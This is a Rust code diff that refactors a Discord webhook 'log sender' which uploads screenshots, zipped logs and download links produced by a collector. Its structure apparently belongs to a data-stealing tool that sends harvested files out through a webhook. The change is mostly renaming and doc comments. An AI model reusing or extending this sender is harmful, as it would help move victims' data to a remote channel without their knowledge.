@@ -1,4 +1,4 @@
-use crate::{LogContent, LogFile, LogSender, SendError};
+use crate::{ExternalLink, LogContent, LogFile, LogSender, SendError};
 use alloc::string::{String, ToString};
 use alloc::sync::Arc;
 use alloc::{format, vec};
@@ -12,8 +12,21 @@ use requests::{
 };
 use utils::format_size;
 
+/// A log sender that transmits data to a Discord channel using a webhook.
+///
+/// `DiscordWebhookSender` uses Discord's webhook API to send embedded messages
+/// and files such as screenshots or zipped logs. It supports formatting logs
+/// with rich embeds and fallbacks for size constraints.
+///
+/// # Fields
+///
+/// - `webhook`: The full Discord webhook URL, including the webhook ID and token.
+///
+/// # Notes
+///
+/// - Discord has a file upload limit of 8 MB per file.
 #[derive(Clone, new)]
-pub struct DiscordWebhook {
+pub struct DiscordWebhookSender {
     webhook: Arc<str>,
 }
 
@@ -23,8 +36,8 @@ where
     C: Collector,
 {
     let link = match log {
-        LogContent::ExternalLink((link, size)) => Some(format!(
-            r#"[Download [{size}]]({link})"#,
+        LogContent::ExternalLink(ExternalLink {service_name, link, size}) => Some(format!(
+            r#"[Download from {service_name} [{size}]]({link})"#,
             size = format_size(*size as _)
         )),
         _ => None,
@@ -109,7 +122,7 @@ where
     }
 }
 
-impl DiscordWebhook {
+impl DiscordWebhookSender {
     fn send_multipart(&self, builder: MultipartBuilder) -> Result<(), SendError> {
         let content_type = builder.content_type();
         let body = builder.finish();
@@ -126,7 +139,7 @@ impl DiscordWebhook {
     }
 }
 
-impl LogSender for DiscordWebhook {
+impl LogSender for DiscordWebhookSender {
     fn send<P, C>(
         &self,
         log_file: LogFile,
@@ -138,8 +151,7 @@ impl LogSender for DiscordWebhook {
         C: Collector,
     {
         if let LogContent::ZipArchive(archive) = &log_file.content
-            && archive.len() >= 8 * 1024 * 1024
-        // 8 MB
+            && archive.len() >= 8 * 1024 * 1024 // 8 MB
         {
             return Err(SendError::LogFileTooBig);
         }
